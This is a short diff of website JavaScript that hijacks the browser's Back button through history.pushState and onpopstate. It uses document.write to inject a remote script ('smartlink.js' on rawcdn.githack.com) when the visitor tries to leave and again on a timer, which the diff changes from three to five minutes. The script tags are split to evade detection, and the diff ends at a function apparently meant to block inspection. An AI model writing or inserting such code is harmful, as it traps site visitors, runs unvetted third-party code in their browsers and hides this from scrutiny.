@@ -3,7 +3,7 @@
         history.pushState("back", null, null);
         window.onpopstate = function() {
             history.pushState('back', null, null);
-				document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
+		document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
         };
     }
 
@@ -29,8 +29,8 @@ for (var i = 0; i < images.length; i++) {
 
 // time out
 setTimeout(function() {
-    document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/dbd4a861cba4a15479760086272ba21723b91cc0/random/janda.js"></scr' + 'ipt>');
-}, 3 * 60 * 1000);
+    document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
+}, 5 * 60 * 1000);
 
 // inspect
 ! function t() {
